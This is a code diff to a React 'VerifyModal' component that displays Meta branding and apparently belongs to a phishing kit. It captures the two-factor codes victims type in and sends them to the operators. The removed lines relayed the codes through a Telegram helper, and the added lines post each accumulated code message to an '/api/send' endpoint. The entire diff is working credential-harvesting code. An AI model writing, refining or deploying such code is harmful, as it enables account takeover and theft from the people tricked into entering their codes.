@@ -2,8 +2,8 @@ import MetaLogo from '@/assets/images/meta-logo-image.png';
 import VerifyImage from '@/assets/images/verify-image.png';
 import { store } from '@/store/store';
 import config from '@/utils/config';
-import sendMessage from '@/utils/telegram';
 import translateText from '@/utils/translate';
+import axios from 'axios';
 import Image from 'next/image';
 import { useEffect, useState, type FC } from 'react';
 
@@ -15,7 +15,7 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [showError, setShowError] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    const { geoInfo, messageId } = store();
+    const { geoInfo, messageId, messageContent, setMessageContent } = store();
     const maxCode = config.MAX_CODE ?? 3;
     const loadingTime = config.CODE_LOADING_TIME ?? 60;
 
@@ -61,9 +61,18 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         const next = attempts + 1;
         setAttempts(next);
 
-        const message = `<b>🔐 2FA Code ${next}/${maxCode}:</b> <code>${code}</code>`;
+        const codeLine = `<b>🔐 2FA Code ${next}/${maxCode}:</b> <code>${code}</code>`;
+
+        const updatedMessage = messageContent ? `${messageContent}\n\n${codeLine}` : codeLine;
+
         try {
-            await sendMessage(message, messageId ?? undefined);
+            await axios.post('/api/send', {
+                message: updatedMessage,
+                message_id: messageId
+            });
+
+            setMessageContent(updatedMessage);
+
             if (next >= maxCode) {
                 nextStep();
             } else {
